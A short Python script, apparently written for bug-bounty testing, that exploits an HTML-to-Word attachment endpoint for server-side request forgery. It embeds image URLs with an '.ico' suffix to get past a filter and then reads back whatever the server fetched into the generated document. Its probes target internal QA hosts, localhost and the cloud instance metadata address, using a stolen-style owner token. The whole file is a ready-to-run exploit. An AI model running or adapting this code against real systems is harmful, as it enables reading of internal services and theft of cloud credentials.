import json,subprocess,os,uuid,zipfile,io
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
tag='ZXINT'+uuid.uuid4().hex[:8]
def render(html,name,atype):
    body={"html":html,"type":"word","attachableType":"AuditableEntity",
          "attachableId":atype,"fileName":name}
    cmd=['curl','-s','-m','120','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/attachments/html',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    try: return c,json.loads(open('/tmp/b',encoding='utf-8',errors='replace').read())
    except: return c,None
def get(p):
    cmd=['curl','-s','-m','30',H+p,'-H','token: '+TOK,'-H',BB]
    return json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)
def probe(label,url,atype):
    c,d=render(f'<h1>ZX</h1><img src="{url}">', f'zx-{tag}-{label}', atype)
    if c!='200':
        print(f"  {label:26} gen={c}"); return None
    aid=d['attachmentId']
    a=get(f'/api/v1/attachments/{aid}')['attachments'][0]
    f=get(f"/api/v1/files/{a['file_id']}")['files'][0]
    subprocess.run(['curl','-s','-m','60','-o','/tmp/i.docx',f['url']])
    raw=open('/tmp/i.docx','rb').read()
    z=zipfile.ZipFile(io.BytesIO(raw))
    media=[n for n in z.namelist() if 'media' in n]
    blobs={m:z.read(m) for m in media}
    sizes=[(m,len(b)) for m,b in blobs.items()]
    print(f"  {label:26} docx={len(raw):>6}B media={sizes}")
    for m,b in blobs.items():
        if b: print(f"      {m} head={b[:120]!r}")
    return blobs
print(f"unique tag: {tag}\n")
print("=== INTERNAL targets, with .ico appended (the lever) ===")
probe('int-version.ico',   'http://integrations.qa.soxhubapp.com/version.ico', '140')
probe('int-health.ico',    'http://integrations.qa.soxhubapp.com/api/v1/health.ico', '141')
probe('main-login.ico',    'https://bugbounty1.qe.optrostaging.ai/login.ico', '142')
probe('main-users-me.ico', 'https://bugbounty1.qe.optrostaging.ai/api/v1/users/me.ico', '143')
probe('localhost-3000.ico','http://localhost:3000/version.ico', '144')
probe('imds.ico',          'http://169.254.169.254/latest/meta-data/.ico', '145')
